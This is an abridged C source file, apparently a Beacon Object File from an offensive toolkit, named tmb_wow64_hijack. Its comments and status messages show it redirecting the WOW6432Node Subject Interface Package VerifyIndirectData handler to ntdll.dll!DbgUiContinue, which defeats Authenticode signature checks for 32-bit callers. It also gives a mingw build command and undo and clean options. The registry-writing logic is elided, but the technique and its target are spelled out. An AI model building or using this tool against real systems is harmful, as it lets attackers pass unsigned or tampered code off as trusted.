/*
 * tmb_wow64_hijack.c - WOW6432Node-only SIP VerifyIndirectData redirect
 *
 * Writes only the WOW6432Node SIP registry path.
 *
 ...
 *
 * Build: x86_64-w64-mingw32-gcc -o bofs/bin/tmb_wow64_hijack.o -c bofs/src/tmb_wow64_hijack.c -I bofs/include -Wall -Wno-unused-function
 */
...
static void tmb_print_undo(const char *guid_list, short flags) {
    if (flags & 1) {
        TMB_INFO("Undo: tmb_wow64_hijack --clean --all-sips%s", (flags & 2) ? " --sac" : "");
    } else if (guid_list && *guid_list) {
        TMB_INFO("Undo: tmb_wow64_hijack --clean --sip-types %s%s", guid_list, (flags & 2) ? " --sac" : "");
    } else {
        TMB_INFO("Undo: tmb_wow64_hijack --clean%s", (flags & 2) ? " --sac" : "");
    }
}
...
void go(char *args, int alen) {
    ...
    if (!ok) {
        TMB_ERR("One or more WOW6432Node SIP writes failed. Verify admin privileges.");
        return;
    }

    if (action == 0) {
        TMB_OK("WOW6432Node SIP VerifyIndirectData redirected to ntdll.dll!DbgUiContinue.");
        TMB_WARN("32-bit-only callers are affected. Native 64-bit callers are unchanged.");
        tmb_print_undo(guid_list, flags);
    } else {
        TMB_OK("WOW6432Node SIP VerifyIndirectData restored to WINTRUST.DLL!CryptSIPVerifyIndirectData.");
    }
}
